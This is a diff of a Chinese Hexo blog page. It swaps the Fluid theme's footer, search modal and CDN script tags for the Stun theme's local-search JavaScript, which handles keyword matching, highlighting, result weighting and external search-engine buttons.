+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
 
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
 
-    
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
 
-    
-      <a id="scroll-top-button" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
 
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-    
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
 
-    
-  </main>
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
 
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    <!--《添加网站运行时间 -->
-<br/>
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
 
-<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
-<script>
-var now = new Date(); 
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
 
-function createtime() {
-    //此处修改你的建站时间或者网站上线时间
-    var grt = new Date('03/01/2020 8:00:00');
-    now.setTime(now.getTime() + 250);
-    days = (now - grt) / 1000 / 60 / 60 / 24;
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
 
-    dnum = Math.floor(days);
-    hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
-    hnum = Math.floor(hours);
-    if (String(hnum).length == 1) {
-        hnum = "0" + hnum;
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
     }
-    minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
-    mnum = Math.floor(minutes);
-    if (String(mnum).length == 1) {
-        mnum = "0" + mnum;
-    }
-    seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-    snum = Math.round(seconds);
-    if (String(snum).length == 1) {
-        snum = "0" + snum;
-    }
-    document.getElementById("timeDate").innerHTML = " 本站已安全运行 " + dnum + " 天 ";
-    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+  });
 }
-setInterval("createtime()", 250);
-</script>
 
-<!-- 添加网站运行时间》-->
-  </div>
-  
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
 
-  
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
 
-    <div class="footer-center">
-         <!--添加工信备案号-->
-         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
-         <a href="http://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">豫ICP备2021010365号-1</a>
-         <br/>
-         <!--添加公安备案号-->
-         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
-         <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41040202000160"  style="color:#f72b07" target="_blank">豫公网安备41040202000160号</a>
-      </div>
-  
-</footer>
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
 
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
 
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
 
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
 
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
 
-<!-- Plugins -->
+var assistSearchList = window.CONFIG.assistSearch;
 
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
-
-
-
-  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
-
-
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    (function () {
-      var path = "/search.json";
-      $('#local-search-input').on('click', function() {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      });
-      $('#modalSearch').on('shown.bs.modal', function() {
-        $('#local-search-input').focus();
-      });
-    })()
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
-<script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
-</html>
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
